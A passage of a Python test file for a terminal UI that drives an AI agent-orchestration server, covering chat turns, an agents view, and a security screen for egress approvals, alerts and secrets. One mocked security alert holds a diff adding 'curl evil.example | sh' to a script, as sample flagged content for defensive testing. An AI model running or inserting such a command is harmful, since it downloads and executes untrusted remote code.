        assert [r[0] for r in app.screen.rows] == [jav3.NEW_PROJECT, "none", "follow", "demo"]
        await pilot.press("enter")                             # "+ New project"
        await _until(pilot, lambda: type(app.screen).__name__ == "Ask")
        await pilot.press(*"New thing", "enter")
        assert await _until(pilot, lambda: app.project == "new-thing")
        assert ("POST", "/api/projects", {"name": "New thing"}) in seen
        assert app.project_mode == "pin"


async def test_exit_words_quit_only_when_alone(cfg):
    pytest.importorskip("textual")
    seen: list = []
    events = [{"type": "start", "conversation_id": 3},
              {"type": "final", "content": "ok", "conversation_id": 3}]
    app = jav3.build_tui("http://h:1", "jvd_x", transport=_fake_server(events, seen))
    async with app.run_test(size=(140, 40)) as pilot:
        await pilot.pause(0.3)
        exits: list = []
        app.exit = lambda *a, **k: exits.append(1)
        app.editor.text = "please exit now"
        await pilot.press("enter")
        await _until(pilot, lambda: seen and not app.busy)
        assert seen[0]["message"] == "please exit now" and exits == []
        app.editor.text = "  Exit "
        await pilot.press("enter")
        await pilot.pause(0.1)
        assert exits == [1] and len(seen) == 1


async def test_notifications_badge_while_the_sidebar_is_hidden(cfg):
    pytest.importorskip("textual")
    events = [{"type": "start", "conversation_id": 5},
              {"type": "final", "content": "done", "conversation_id": 5}]
    app = jav3.build_tui("http://h:1", "jvd_x", transport=_fake_server(events, []))
    async with app.run_test(size=(140, 40)) as pilot:
        await pilot.pause(0.3)
        assert app.query_one("#sidebar").display is False
        app.editor.text = "go"
        await pilot.press("enter")
        await _until(pilot, lambda: app.cid == 5 and not app.busy)
        await pilot.pause(0.2)
        # a finished turn with the sidebar hidden is a notification
        assert app.unread == 1 and app.notices[0][1] == "done"
        assert "● 1" in _text(app.query_one("#status-right"))
        await app.note("boom", "error")                       # errors are too
        assert app.unread == 2 and app.notices[0][2] == "boom"
        for i in range(60):
            app.push_notice(f"n{i}", toast=False)
        assert len(app.notices) == jav3.NOTICE_CAP and app.notices[0][2] == "n59"
        await pilot.press("ctrl+b")
        await pilot.pause(0.1)
        assert app.unread == 0 and app.query_one("#sidebar").display is True
        assert "● " not in _text(app.query_one("#status-right"))
        assert "n59" in _text(app.query_one("#sb-notes"))
        app.push_notice("seen it")                            # shown: no badge
        assert app.unread == 0


# --- mid-turn messages, /orchestration, the agents screen ------------------------------

class _LiveServer:
    """A fake server whose /api/chat streams stay open until the test pushes
    `final`, so messages can be typed mid-turn. Implements the mid-turn,
    agents and orchestration contract."""

    def __init__(self, projects=(), nodes=(), messages=None):
        import asyncio
        self.asyncio = asyncio
        self.chats: list[dict] = []          # bodies POSTed to /api/chat
        self.posted: list[tuple] = []        # (cid, text) POSTed mid-turn
        self.paths: list[str] = []
        self.running = False
        self.queues: list = []               # one event queue per /api/chat stream
        self.projects = list(projects)
        self.nodes = list(nodes)
        self.messages = messages or {}       # cid -> /messages body
        self.streams: dict = {}              # path -> events for GET streams

    def push(self, ev):
        self.queues[-1].put_nowait(ev)
        if ev.get("type") in ("final", "error"):
            self.running = False

    def transport(self):
        async def body(q):
            while True:
                ev = await q.get()
                yield f"data: {json.dumps(ev)}\n\n".encode()
                if ev.get("type") in ("final", "error"):
                    return

        async def handler(request: httpx.Request) -> httpx.Response:
            path = request.url.path
            self.paths.append(f"{request.method} {path}")
            if path == "/api/devices/whoami":
                return httpx.Response(200, json={"username": "device:test"})
            if path == "/api/chat/options":
                return httpx.Response(200, json={
                    "default": "deepseek/deepseek-flash", "active_project": None,
                    "models": [{"id": "deepseek/deepseek-flash", "label": "Flash"}],
                    "projects": self.projects, "agents": []})
            if path == "/api/conversations":
                return httpx.Response(200, json={"conversations": []})
            if path.endswith("/info"):
                return httpx.Response(200, json={"title": "t"})
            if path == "/api/chat/agents":
                return httpx.Response(200, json={"nodes": self.nodes})
            if path == "/api/chat" and request.method == "POST":
                self.chats.append(json.loads(request.content))
                q = self.asyncio.Queue()
                self.queues.append(q)
                self.running = True
                return httpx.Response(200, content=body(q),
                                      headers={"content-type": "text/event-stream"})
            parts = path.strip("/").split("/")
            if len(parts) == 4 and parts[:2] == ["api", "chat"] and parts[3] == "message":
                if not self.running:
                    return httpx.Response(409, json={"detail": "no_turn_running"})
                self.posted.append((int(parts[2]), json.loads(request.content)["text"]))
                return httpx.Response(200, json={"queued": True})
            if path.endswith("/messages"):
                cid = int(parts[2])
                return httpx.Response(200, json=self.messages.get(cid, {"messages": []}))
            if path in self.streams:
                text = "".join(f"data: {json.dumps(ev)}\n\n" for ev in self.streams[path])
                return httpx.Response(200, text=text,
                                      headers={"content-type": "text/event-stream"})
            return httpx.Response(404, json={"detail": "nope"})
        return httpx.MockTransport(handler)


async def test_tui_mid_turn_messages(cfg):
    """Enter while a turn runs posts to /api/chat/{cid}/message; the message is
    dimmed until operator_message; a 409 and an `undelivered` both become the
    next turn."""
    pytest.importorskip("textual")
    srv = _LiveServer()
    app = jav3.build_tui("http://h:1", "jvd_x", transport=srv.transport())
    async with app.run_test(size=(140, 40)) as pilot:
        await pilot.pause(0.3)
        # typed before `start`: held locally, posted once the id arrives
        app.editor.text = "go"
        await pilot.press("enter")
        assert await _until(pilot, lambda: srv.queues)
        app.editor.text = "early"
        await pilot.press("enter")
        await pilot.pause(0.1)
        assert app.queue == ["early"] and srv.posted == []
        srv.push({"type": "start", "conversation_id": 9})
        assert await _until(pilot, lambda: srv.posted == [(9, "early")])
        assert app.queue == []
        # after `start`: straight to the server, shown pending
        srv.push({"type": "tool", "id": "1", "name": "run_code", "args": {"command": "ls"}})
        app.editor.text = "steer left"
        await pilot.press("enter")
        assert await _until(pilot, lambda: (9, "steer left") in srv.posted)
        pend = [w for w in app.query("QueuedMsg") if w.has_class("pending")]
        assert {w.text for w in pend} == {"early", "steer left"}
        srv.push({"type": "tool_result", "id": "1", "name": "run_code", "ok": True,
                  "result": "a"})
        srv.push({"type": "operator_message", "text": "steer left"})
        srv.push({"type": "operator_message", "text": "early"})
        assert await _until(pilot, lambda: not app.pending)
        assert not any(w.has_class("pending") for w in app.query("QueuedMsg"))
        # the turn ends before this one is delivered: it is the next turn
        app.editor.text = "late"
        await pilot.press("enter")
        assert await _until(pilot, lambda: (9, "late") in srv.posted)
        srv.push({"type": "final", "content": "ok", "conversation_id": 9,
                  "undelivered": ["late"]})
        assert await _until(pilot, lambda: len(srv.chats) == 2)
        assert srv.chats[1] == {"message": "late", "conversation_id": 9}
        assert not [w for w in app.query("QueuedMsg") if w.text == "late"]
        # 409: the server's turn is over but our stream has not said so yet
        srv.push({"type": "start", "conversation_id": 9})
        assert await _until(pilot, lambda: app.turn is not None and app.turn.cid == 9)
        srv.running = False
        app.editor.text = "too late"
        await pilot.press("enter")
        assert await _until(pilot, lambda: app.queue == ["too late"])
        srv.queues[-1].put_nowait({"type": "final", "content": "done", "conversation_id": 9})
        assert await _until(pilot, lambda: len(srv.chats) == 3)
        assert srv.chats[2]["message"] == "too late"
        srv.push({"type": "final", "content": "x", "conversation_id": 9})
        assert await _until(pilot, lambda: not app.busy)


async def test_tui_orchestration_sends_mode_project_and_braindump(cfg):
    pytest.importorskip("textual")
    srv = _LiveServer(projects=[{"slug": "demo", "name": "Demo"},
                                {"slug": "site", "name": "Site"}])
    app = jav3.build_tui("http://h:1", "jvd_x", transport=srv.transport())
    async with app.run_test(size=(140, 40)) as pilot:
        await pilot.pause(0.3)
        app.dispatch("/orchestration")
        assert await _until(pilot, lambda: type(app.screen).__name__ == "Picker")
        await pilot.press("s", "i", "enter")          # filter to "site"
        assert await _until(pilot, lambda: type(app.screen).__name__ == "BrainDump")
        app.screen.query_one("#dump").text = "fix the build\nand ship the docs"
        await pilot.press("ctrl+s")
        assert await _until(pilot, lambda: srv.chats)
        body = srv.chats[0]
        assert body["mode"] == "orchestrate" and body["project"] == "site"
        assert body["message"] == "fix the build\nand ship the docs"
        assert body["conversation_id"] is None and "agent" not in body
        assert app.orchestrator
        assert "orchestrator" in str(app.query_one("#meta").render())
        srv.push({"type": "start", "conversation_id": 30})
        srv.push({"type": "final", "content": "sent 2 agents", "conversation_id": 30})
        assert await _until(pilot, lambda: not app.busy)
        # esc cancels the brain-dump
        app.dispatch("/orchestrate demo")
        assert await _until(pilot, lambda: type(app.screen).__name__ == "BrainDump")
        await pilot.press("escape")
        await pilot.pause(0.2)
        assert type(app.screen).__name__ != "BrainDump" and len(srv.chats) == 1


def test_agent_tree_groups_roots_and_orders_descendants():
    t = jav3.AgentTree([
        {"id": 1, "parent_id": None, "kind": "orchestrator", "project": "b", "running": True},
        {"id": 2, "parent_id": 1, "kind": "agent", "project": "b", "started_at": "2"},
        {"id": 3, "parent_id": 2, "kind": "subagent", "project": "b"},
        {"id": 4, "parent_id": 1, "kind": "agent", "project": "b", "started_at": "3"},
        {"id": 5, "parent_id": 99, "kind": "chat", "project": "a"},   # parent not listed
        {"id": 6, "parent_id": None, "kind": "chat", "project": None},
    ])
    assert [p for p, _ in t.groups] == ["a", "b", None]
    assert [r["id"] for r in t.roots] == [5, 1, 6]
    assert [(n["id"], d) for n, d in t.descendants(1)] == [(2, 1), (3, 2), (4, 1)]
    assert t.root_of(3) == 1 and t.counts() == (1, 6, 2)


async def test_tui_agents_screen(cfg):
    """Against an older server (no status/scope): the running root is Active,
    the rest behind Finished. ↑↓ move between entries (the highlighted one
    unfolds), → and ← step into and out of its agents, enter opens."""
    pytest.importorskip("textual")
    nodes = [
        {"id": 10, "parent_id": None, "kind": "orchestrator", "title": "Ship it",
         "agent_slug": None, "project": "demo", "model": "deepseek/deepseek-flash",
         "running": True, "started_at": "2026-09-25T10:00:00"},
        {"id": 11, "parent_id": 10, "kind": "agent", "title": "[item i1] build the thing",
         "agent_slug": "coder", "project": "demo", "model": None, "running": True,
         "started_at": "2026-09-25T10:01:00"},
        {"id": 12, "parent_id": 11, "kind": "subagent", "title": "grep", "agent_slug": None,
         "project": "demo", "model": None, "running": False, "started_at": "2026-09-25T10:02:00"},
        {"id": 13, "parent_id": 10, "kind": "agent", "title": "docs", "agent_slug": "writer",
         "project": "demo", "model": None, "running": False, "started_at": "2026-09-25T10:03:00"},
        {"id": 20, "parent_id": None, "kind": "chat", "title": "quick q", "agent_slug": None,
         "project": "site", "model": None, "running": False, "started_at": "2026-09-25T09:00:00"},
    ]
    msgs = {11: {"messages": [{"role": "user", "content": "build it"},
                              {"role": "assistant", "content": "",
                               "activity": [{"name": "run_code", "args": {"command": "make"},
                                             "ok": True, "result": "ok"}]}],
                 "running": True},
            20: {"messages": [{"role": "user", "content": "hi"},
                              {"role": "assistant", "content": "hello"}]}}
    srv = _LiveServer(nodes=nodes, messages=msgs)
    srv.streams["/api/chat/agents/11/stream"] = [
        {"type": "tool", "id": "t", "name": "read_file", "args": {"path": "x"}},
        {"type": "tool_result", "id": "t", "name": "read_file", "ok": True, "result": "x"},
        {"type": "final", "content": "built", "conversation_id": 11}]
    app = jav3.build_tui("http://h:1", "jvd_x", transport=srv.transport(), resume=20)
    async with app.run_test(size=(140, 40)) as pilot:
        assert await _until(pilot, lambda: app.cid == 20)
        await pilot.press("left")                        # empty prompt: open the screen
        assert await _until(pilot, lambda: type(app.screen).__name__ == "AgentsScreen")
        scr = app.screen
        assert await _until(pilot, lambda: scr.loaded and len(scr.query("AgentRow")) > 1)

        def rows():
            return [(r.kind, r.nid) for r in scr.query("AgentRow")]

        def sel():
            return [r.nid for r in scr.query("AgentRow") if r.has_class("-sel")]
        # we came from 20, which has finished: the finished view opens on it, green
        assert scr.mode == "finished" and sel() == [20]
        assert [r.nid for r in scr.query("AgentRow") if r.has_class("current")] == [20]
        # esc: back to the active view, on the Finished row
        await pilot.press("escape")
        await pilot.pause(0.1)
        assert scr.mode == "active" and sel() == ["finished"]
        assert "1 running" in str(scr.query_one("#ag-head").render())
        # ↑ to the orchestrator: it unfolds; ↓ skips its agents to Finished
        await pilot.press("up")
        await pilot.pause(0.1)
        assert sel() == [10]
        assert rows() == [("section", None), ("root", 10), ("child", 11), ("child", 12),
                          ("child", 13), ("link", "finished")]
        assert "build the thing" in str(scr.query("AgentRow")[2].render())
        assert "[item" not in str(scr.query("AgentRow")[2].render())
        await pilot.press("down")
        await pilot.pause(0.1)
        assert sel() == ["finished"]
        # → steps into the agents, ↑↓ walk them, ← steps back out
        await pilot.press("up", "right", "down")
        await pilot.pause(0.1)
        assert sel() == [12]
        await pilot.press("left")
        await pilot.pause(0.1)
        assert sel() == [10] and not scr.in_kids
        await pilot.press("right", "enter")              # open agent 11: running
        assert await _until(pilot, lambda: type(app.screen).__name__ != "AgentsScreen")
        assert await _until(pilot, lambda: "GET /api/chat/agents/11/stream" in srv.paths)
        assert await _until(pilot, lambda: not app.busy and app.last_reply == "built")
        assert app.cid == 11 and "GET /api/conversations/11/messages" in srv.paths
        names = [tv.tname for tv in app.query("ToolView")]
        assert names == ["run_code", "read_file"]
        # back in: now 11 is the green one, inside its orchestrator; ← twice leaves
        await pilot.press("left")
        assert await _until(pilot, lambda: type(app.screen).__name__ == "AgentsScreen")
        scr = app.screen
        assert await _until(pilot, lambda: scr.loaded and len(scr.query("AgentRow")) > 1)
        assert [r.nid for r in scr.query("AgentRow") if r.has_class("current")] == [11]
        assert scr.in_kids and sel() == [11]
        await pilot.press("left", "left")
        assert await _until(pilot, lambda: type(app.screen).__name__ != "AgentsScreen")


async def test_tui_agents_screen_needs_you_and_finished_grouping(cfg):
    """Against the new contract: status/needs/role/title, scope=active and
    scope=finished; Needs you gets its own section; tab regroups Finished."""
    pytest.importorskip("textual")
    from datetime import datetime, timedelta, timezone
    now = datetime.now(timezone.utc)
    iso = lambda d: (now - timedelta(days=d)).strftime("%Y-%m-%d %H:%M:%S")  # noqa: E731
    active = [
        {"id": 1, "parent_id": None, "kind": "orchestrator", "title": "Ship v2", "role":
         "orchestrator", "status": "running", "running": True, "project": "demo",
         "started_at": iso(0)},
        {"id": 2, "parent_id": None, "kind": "agent", "title": "Weather scout", "role":
         "@weather", "status": "needs_you", "needs": "approval pending: egress to api.x.com",
         "running": False, "project": "home", "started_at": iso(0)},
    ]
    finished = [
        {"id": 5, "parent_id": None, "kind": "chat", "title": "Old A", "status": "done",
         "project": "demo", "started_at": iso(0), "ended_at": iso(0)},
        {"id": 6, "parent_id": None, "kind": "agent", "title": "Old B", "status": "failed",
         "project": "home", "started_at": iso(3), "ended_at": iso(3)},
    ]

    def handler(request):
        path, q = request.url.path, request.url.params
        if path == "/api/devices/whoami":
            return httpx.Response(200, json={"username": "device:test"})
        if path == "/api/chat/agents":
            if q.get("scope") == "finished":
                return httpx.Response(200, json={"nodes": finished, "total": 2})
            return httpx.Response(200, json={"nodes": active})
        if path == "/api/conversations":
            return httpx.Response(200, json={"conversations": []})
        return httpx.Response(404, json={"detail": "nope"})
    app = jav3.build_tui("http://h:1", "jvd_x", transport=httpx.MockTransport(handler))
    async with app.run_test(size=(140, 40)) as pilot:
        await pilot.pause(0.3)
        await pilot.press("left")
        assert await _until(pilot, lambda: type(app.screen).__name__ == "AgentsScreen")
        scr = app.screen
        assert await _until(pilot, lambda: scr.loaded and len(scr.query("AgentRow")) > 3)
        text = [str(r.render()) for r in scr.query("AgentRow")]
        assert text[0].startswith("Active") and any(t.startswith("Needs you") for t in text)
        assert any("approval pending: egress" in t for t in text)
        assert "1 need you" in str(scr.query_one("#ag-head").render())
        assert "Finished" in text[-1] and "2" in text[-1]
        await pilot.press("down", "down", "enter")       # the Finished row
        await pilot.pause(0.2)
        assert scr.mode == "finished"
        groups = [str(r.render()) for r in scr.query("AgentRow") if r.kind == "group"]
        assert [g.split()[1] for g in groups] == ["demo", "home"]
        await pilot.press("tab")
        await pilot.pause(0.1)
        groups = [str(r.render()).split("  ")[0] for r in scr.query("AgentRow")
                  if r.kind == "group"]
        assert groups == ["Today", "This week"]


def test_agent_titles_and_roles_read_cleanly():
    assert jav3.clean_title("[item i1] Create notes/hello.txt containing hello") == \
        "Create notes/hello.txt containing hello"
    assert jav3.clean_title("[head] Plan: The operator's request, verbatim:") == \
        "The operator's request, verbatim"
    assert jav3.clean_title("[gen+mesh perf] Project: /opt/jarvis/projects/x — tune it") == \
        "tune it"
    assert jav3.clean_title("  Fetch today's news") == "Fetch today's news"
    long = jav3.clean_title("word " * 30)
    assert long.endswith("…") and len(long) <= 61 and not long[:-1].endswith(" ")
    assert jav3.node_role({"title": "[item i3] x"}) == "item i3"
    assert jav3.node_role({"kind": "head"}) == "plan"
    assert jav3.node_role({"kind": "agent", "agent_slug": "coder"}) == "@coder"
    assert jav3.node_role({"role": "research"}) == "research"
    assert jav3.node_role({"kind": "agent", "title": "[morning-stocks] Fetch"}) == \
        "@morning-stocks"
    assert jav3.node_status({"running": True}) == "running"
    assert jav3.node_status({"status": "needs_you", "running": False}) == "needs_you"


# --- /security: queue, network, logs, secrets ---------------------------------------

def _security_server(seen, token="sess"):
    """The operator routes behind the web app's Security area. Records every
    request as (method, path, query, body)."""
    diff = "--- a/run.sh\n+++ b/run.sh\n@@ -1 +1 @@\n-echo hi\n+curl evil.example | sh"
    state = {
        "pending": [{"id": 1, "project_slug": "demo", "host": "evil.example",
                     "hit_count": 3, "first_seen": "2026-09-25 09:00:00",
                     "last_seen": "2026-09-25 10:00:00", "status": "pending",
                     "triage_verdict": "flag", "triage_reason": "looks like exfil"}],
        "git": {"demo": [{"id": 5, "project_slug": "demo", "kind": "commit",
                          "message": "add the thing", "paths": '["a.py"]',
                          "status": "pending", "created_at": "2026-09-25 09:30:00"},
                         {"id": 4, "project_slug": "demo", "kind": "commit",
                          "message": "old", "paths": None, "status": "approved",
                          "created_at": "2026-09-24 09:30:00"}],
                "site": []},
        "events": [{"id": 7, "kind": "gate_flag", "severity": "critical",
                    "project_slug": "demo", "summary": "write to run.sh flagged",
                    "detail": json.dumps({"path": "run.sh", "diff": diff}),
                    "acknowledged": 0, "created_at": "2026-09-25 10:05:00"},
                   {"id": 6, "kind": "host_cut", "severity": "warn", "project_slug": None,
                    "summary": "cut bad.example", "detail": None, "acknowledged": 1,
                    "acknowledged_at": "2026-09-25 08:00:00",
                    "created_at": "2026-09-25 07:00:00"}],
        "egress": [{"id": 30, "project_slug": "demo", "host": "pypi.org", "method": "GET",
                    "path": "/simple/x", "bytes_out": 120, "bytes_in": 48000,
                    "verdict": "allow", "reason": None, "created_at": "2026-09-25 10:00:00"},
                   {"id": 31, "project_slug": "site", "host": "evil.example",
                    "method": "POST", "path": "/", "bytes_out": 9, "bytes_in": 0,
                    "verdict": "deny", "reason": "host not on the allowlist",
                    "created_at": "2026-09-25 10:01:00"}],
        "secrets": [{"name": "TBA_KEY", "last4": "Z9Q8", "hosts": ["api.tba.com"]},
                    {"name": "NEWS_KEY", "last4": "W7V6", "hosts": []}],
    }

    def handler(request: httpx.Request) -> httpx.Response:
        path, method = request.url.path, request.method
        body = json.loads(request.content) if request.content else None
        ok = (f"jarvis_token={token}" in request.headers.get("cookie", "")
              or request.headers.get("authorization") == "Bearer jvd_x")
        if not ok:
            return httpx.Response(401, json={"detail": "not authenticated"})
        seen.append((method, path, dict(request.url.params), body))
        if path == "/api/devices/whoami":
            return httpx.Response(200, json={"username": "operator"})
        if path == "/api/chat/options":
            return httpx.Response(200, json={"default": "deepseek/deepseek-flash",
                                             "models": [], "projects": [], "agents": []})
        if path == "/api/conversations":
            return httpx.Response(200, json={"conversations": []})
        if path == "/api/agents/notices/stream":
            return httpx.Response(200, text="", headers={"content-type": "text/event-stream"})
        if request.headers.get("authorization"):          # a device token: chat only
            return httpx.Response(403, json={"detail": "operator only"})
        if path == "/api/projects":
            return httpx.Response(200, json={"projects": [{"slug": "demo", "name": "Demo"},
                                                          {"slug": "site", "name": "Site"}]})
        if path.startswith("/api/projects/") and path.endswith("/git/requests"):
            return httpx.Response(200, json={"requests": state["git"][path.split("/")[3]]})
        if "/git/requests/" in path and method == "POST":
            return httpx.Response(200, json={"id": 5, "status": "rejected"})
        if path == "/api/egress/pending":
            return httpx.Response(200, json={"pending": state["pending"]})
        if path.startswith("/api/egress/pending/") and method == "POST":
            return httpx.Response(200, json={"ok": True, "added_to": "demo"})
        if path == "/api/security/events":
            evs = state["events"]
            if request.url.params.get("unacknowledged") == "true":
                evs = [e for e in evs if not e["acknowledged"]]
            return httpx.Response(200, json={"events": evs})
        if path.startswith("/api/security/events/") and path.endswith("/ack"):
            return httpx.Response(200, json={"ok": True})
        if path.startswith("/api/egress/policy/"):
            slug = path.rsplit("/", 1)[1]
            if slug == "__general__":
                return httpx.Response(200, json={"slug": slug, "mode": "allowlist",
                                                 "inherit_general": 1, "hosts": [],
                                                 "effective": ["pypi.org"],
                                                 "source": "general"})
            return httpx.Response(200, json={"slug": slug, "mode": "allowlist",
                                             "inherit_general": 1, "hosts": ["x.org"],
                                             "effective": ["x.org", "pypi.org"],
                                             "source": "project"})
        if path == "/api/egress/summary":
            return httpx.Response(200, json={"allowed": 1, "denied": 1, "waiting": 1})
        if path == "/api/egress/events":
            p = request.url.params.get("project")
            return httpx.Response(200, json={"events": [e for e in state["egress"]
                                                        if not p or e["project_slug"] == p]})
        if path == "/api/secrets" and method == "GET":
            return httpx.Response(200, json={"secrets": state["secrets"]})
        if path.startswith("/api/secrets/") and method in ("PUT", "DELETE"):
            return httpx.Response(200, json={"ok": True})
        return httpx.Response(404, json={"detail": "nope"})
    return httpx.MockTransport(handler)


def _posts(seen):
    return [(m, p, b) for m, p, _, b in seen if m != "GET"]


async def _open_security(pilot, app, arg=""):
    app.dispatch(f"/security {arg}".strip())
    await _until(pilot, lambda: type(app.screen).__name__ == "SecurityScreen")
    return app.screen


def _rows(scr):
    return [str(r.render()) for r in scr.query("SecRow")]


async def test_tui_security_tabs_and_queue_verdicts_after_confirm(cfg):
    pytest.importorskip("textual")
    seen: list = []
    app = jav3.build_tui("http://h:1", "session:sess", transport=_security_server(seen))
    async with app.run_test(size=(150, 45)) as pilot:
        await pilot.pause(0.3)
        assert app.full_access
        scr = await _open_security(pilot, app)
        assert await _until(pilot, lambda: scr.loaded["queue"] and scr.loaded["secrets"])
        await pilot.pause(0.1)
        # header counts: 1 host + 1 pending git request + 1 unacked alert
        assert "Queue 3" in _text(scr.query_one("#sec-tab-queue"))
        assert "Secrets 2" in _text(scr.query_one("#sec-tab-secrets"))
        assert scr.query_one("#sec-tab-queue").has_class("-on")
        rows = _rows(scr)
        assert "evil.example" in rows[0] and "add the thing" in rows[1] \
            and "gate_flag" in rows[2]
        assert not any("old" in r for r in rows)            # approved requests are gone
        # tab / → forward, ← back, numbers jump, wraps round
        for key, tab in (("tab", "network"), ("right", "logs"), ("left", "network"),
                         ("4", "secrets"), ("tab", "queue"), ("left", "secrets"),
                         ("1", "queue")):
            await pilot.press(key)
            assert scr.tab == tab, key
            assert scr.query_one(f"#sec-tab-{tab}").has_class("-on")
        # y on the host: a Confirm, and nothing is sent until it says yes
        await _until(pilot, lambda: scr.loaded["queue"] and len(_rows(scr)) == 3)
        n0 = len(_posts(seen))
        await pilot.press("y")
        assert await _until(pilot, lambda: type(app.screen).__name__ == "Confirm")
        assert "evil.example" in app.screen.question and "allowlist" in app.screen.detail
        await pilot.press("n")
        await pilot.pause(0.2)
        assert len(_posts(seen)) == n0
        await pilot.press("y")
        assert await _until(pilot, lambda: type(app.screen).__name__ == "Confirm")
        await pilot.press("y")
        assert await _until(pilot, lambda: ("POST", "/api/egress/pending/1/approve", None)
                            in _posts(seen))
        # n on the git request: reject, after a Confirm
        assert await _until(pilot, lambda: app.screen is scr)
        await pilot.press("down")
        assert scr.sel["queue"] == "gdemo:5"
        assert "a.py" in _text(scr.query_one("#sec-detail"))
        await pilot.press("n")
        assert await _until(pilot, lambda: type(app.screen).__name__ == "Confirm")
        assert not any("/git/requests/5" in p for _, p, _ in _posts(seen))
        await pilot.press("y")
        assert await _until(pilot, lambda: ("POST", "/api/projects/demo/git/requests/5/reject",
                                            None) in _posts(seen))
        # a on the alert: acknowledge, after a Confirm; its diff shows in the detail
        assert await _until(pilot, lambda: app.screen is scr)
        await pilot.press("down")
        assert "curl evil.example" in _text(scr.query_one("#sec-detail"))
        await pilot.press("a")
        assert await _until(pilot, lambda: type(app.screen).__name__ == "Confirm")
        await pilot.press("escape")
        await pilot.pause(0.2)
        assert not any(p.endswith("/ack") for _, p, _ in _posts(seen))
        await pilot.press("a")
        assert await _until(pilot, lambda: type(app.screen).__name__ == "Confirm")
        await pilot.press("y")
        assert await _until(pilot, lambda: ("POST", "/api/security/events/7/ack", None)
                            in _posts(seen))
        assert await _until(pilot, lambda: app.screen is scr)
        await pilot.press("escape")
        assert await _until(pilot, lambda: type(app.screen).__name__ != "SecurityScreen")


async def test_tui_security_network_and_logs(cfg):
    pytest.importorskip("textual")
    seen: list = []
    app = jav3.build_tui("http://h:1", "session:sess", transport=_security_server(seen))
    async with app.run_test(size=(150, 45)) as pilot:
        await pilot.pause(0.3)
        scr = await _open_security(pilot, app, "network")
        assert scr.tab == "network"
        assert await _until(pilot, lambda: scr.loaded["network"]
                            and "pypi.org" in " ".join(_rows(scr)))
        sub = _text(scr.query_one("#sec-sub"))
        assert "all projects" in sub and "allowlist" in sub and "1 allowed" in sub
        rows = _rows(scr)
        assert any("DENY" in r and "evil.example" in r for r in rows)
        assert any("↑120" in r and "48.0k" in r for r in rows)          # metering
        assert ("GET", "/api/egress/policy/__general__", {}, None) in seen
        # p: the project picker narrows the feed and the policy
        await pilot.press("p")
        assert await _until(pilot, lambda: type(app.screen).__name__ == "Picker")
        await pilot.press("down", "enter")
        assert await _until(pilot, lambda: scr.project == "demo" and scr.loaded["network"])
        assert await _until(pilot, lambda: ("GET", "/api/egress/events",
                                            {"limit": "200", "project": "demo"}, None) in seen)
        assert ("GET", "/api/egress/policy/demo", {}, None) in seen
        assert await _until(pilot, lambda: not any("evil.example" in r for r in _rows(scr)))
        assert "own policy + general" in _text(scr.query_one("#sec-sub"))
        # logs: every event, newest first, severity colours; f filters by kind
        await pilot.press("3")
        assert await _until(pilot, lambda: scr.loaded["logs"] and len(_rows(scr)) == 2)
        rows = _rows(scr)
        assert "gate_flag" in rows[0] and "host_cut" in rows[1]
        assert "CRIT" in rows[0] and "✓" in rows[1]
        assert ("GET", "/api/security/events", {"limit": "200"}, None) in seen
        await pilot.press("f")                                  # all -> gate_flag
        assert scr.log_filter == "gate_flag"
        assert await _until(pilot, lambda: len(_rows(scr)) == 1)
        await pilot.press("f")                                  # -> host_cut
        assert await _until(pilot, lambda: "host_cut" in _rows(scr)[0])
        assert "acknowledged" in _text(scr.query_one("#sec-detail"))
        await pilot.press("a")                                  # already acked: nothing
        await pilot.pause(0.2)
        assert type(app.screen).__name__ == "SecurityScreen"


async def test_tui_security_secrets_never_reads_values(cfg):
    pytest.importorskip("textual")
    seen: list = []
    app = jav3.build_tui("http://h:1", "session:sess", transport=_security_server(seen))
    async with app.run_test(size=(150, 45)) as pilot:
        await pilot.pause(0.3)
        scr = await _open_security(pilot, app)
        await pilot.press("4")
        assert await _until(pilot, lambda: scr.loaded["secrets"] and len(_rows(scr)) == 2)
        shown = " ".join(_rows(scr)) + _text(scr.query_one("#sec-detail"))
        assert "TBA_KEY" in shown and "api.tba.com" in shown
        assert "Z9Q8" not in shown and "W7V6" not in shown      # no piece of a value
        assert all("last4" not in e["raw"] for e in scr.entries["secrets"])
        # add: name, hidden value, hosts -> one PUT
        await pilot.press("a")
        assert await _until(pilot, lambda: type(app.screen).__name__ == "Ask")
        await pilot.press(*"new_key", "enter")
        assert await _until(pilot, lambda: type(app.screen).__name__ == "Ask"
                            and app.screen.secret)
        assert app.screen.query_one("#answer").password is True
        await pilot.press(*"s3cr3t", "enter")
        assert await _until(pilot, lambda: type(app.screen).__name__ == "Ask"
                            and not app.screen.secret)
        await pilot.press(*"a.com, b.com", "enter")
        assert await _until(pilot, lambda: ("PUT", "/api/secrets/NEW_KEY",
                                            {"value": "s3cr3t", "hosts": ["a.com", "b.com"]})
                            in _posts(seen))
        assert await _until(pilot, lambda: app.screen is scr)
        assert "s3cr3t" not in " ".join(_rows(scr)) + _text(scr.query_one("#sec-sub"))
        # delete: only after the Confirm
        await pilot.press("down")                               # NEWS_KEY
        await pilot.press("d")
        assert await _until(pilot, lambda: type(app.screen).__name__ == "Confirm")
        assert "NEWS_KEY" in app.screen.question
        await pilot.press("n")
        await pilot.pause(0.2)
        assert not any(m == "DELETE" for m, _, _ in _posts(seen))
        await pilot.press("d")
        assert await _until(pilot, lambda: type(app.screen).__name__ == "Confirm")
        await pilot.press("y")
        assert await _until(pilot, lambda: ("DELETE", "/api/secrets/NEWS_KEY", None)
                            in _posts(seen))
        # the only secrets read is the list: no per-secret GET, ever
        reads = [p for m, p, _, _ in seen if m == "GET" and p.startswith("/api/secrets")]
        assert reads and set(reads) == {"/api/secrets"}


async def test_tui_security_locked_for_a_chat_only_login(cfg):
    pytest.importorskip("textual")
    seen: list = []
    app = jav3.build_tui("http://h:1", "jvd_x", transport=_security_server(seen))
    async with app.run_test(size=(150, 45)) as pilot:
        await pilot.pause(0.3)
        assert not app.full_access
        scr = await _open_security(pilot, app)
        await pilot.pause(0.2)
        assert "needs full access" in _text(scr.query_one("#sec-sub"))
        assert "needs full access" in " ".join(_rows(scr))
        for key in ("2", "3", "4", "y", "a", "p", "r"):
            await pilot.press(key)
        await pilot.pause(0.3)
        assert type(app.screen).__name__ == "SecurityScreen"
        guarded = ("/api/security", "/api/egress", "/api/secrets", "/api/projects")
        assert not [p for _, p, _, _ in seen if p.startswith(guarded)]


# --- found by driving the TUI like an operator (QA pass, 2026-09-26) -------------------

def test_markup_escape_survives_unbalanced_brackets():
    """A `[` with no `]` after it swallowed the markup that followed and the
    next [/] raised MarkupError: the real server's "[startup — …" chat titles
    crashed /sessions. Every `[` is escaped now, and a trailing backslash can
